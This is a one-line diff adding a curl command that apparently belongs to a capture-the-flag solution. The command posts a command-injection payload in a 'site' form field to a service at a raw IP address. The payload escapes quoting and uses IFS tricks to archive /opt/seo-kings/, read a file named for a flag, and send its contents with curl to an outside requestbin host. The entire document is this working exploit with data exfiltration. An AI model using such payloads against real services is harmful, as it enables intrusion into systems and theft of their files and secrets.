@@ -1,0 +1,1 @@
+curl 188.246.233.46:8080 --data "site=http://negasora.com';IFS=:;b=tar:-cvzf:/opt/seo-kings/:/tmp/okaypls.tgz;\$b;d=cat:app/constants/file_wtih_flag.rb;a=curl:--data:\"pls=\$(\$d)\":requestbin.fullcontact.com/1cqmpje1;\$a;'&submit=Try"
